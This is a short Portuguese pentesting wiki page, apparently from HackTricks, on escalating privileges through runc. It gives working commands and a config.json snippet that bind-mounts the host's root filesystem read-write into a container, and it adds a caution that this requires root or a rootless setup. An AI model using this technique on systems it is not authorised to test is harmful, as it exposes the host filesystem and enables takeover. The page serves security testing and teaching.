# Escalonamento de privilégios do RunC

## Informações básicas

Se quiser saber mais sobre **runc**, consulte a página a seguir:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Se `runc` estiver disponível para um processo rootful no host, você poderá usar um OCI bundle cuja configuração de montagem faça bind-mount recursivo do `/` do host em `/` dentro do container, expondo o sistema de arquivos do host nesse namespace de montagem.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> O fluxo de trabalho documentado de `runc run` é rootful: os próprios exemplos do runc o rotulam como "executar como root". Um usuário sem privilégios precisa de uma configuração rootless, como `runc spec --rootless`, e o runc documenta que os user namespaces devem estar habilitados para esse modo.<sup>[[1]](#references)</sup>

## References

- [1] [runc: ferramenta CLI para gerar e executar containers](https://github.com/opencontainers/runc#using-runc)
- [2] [Especificação de Runtime da OCI: mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Subárvores compartilhadas](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
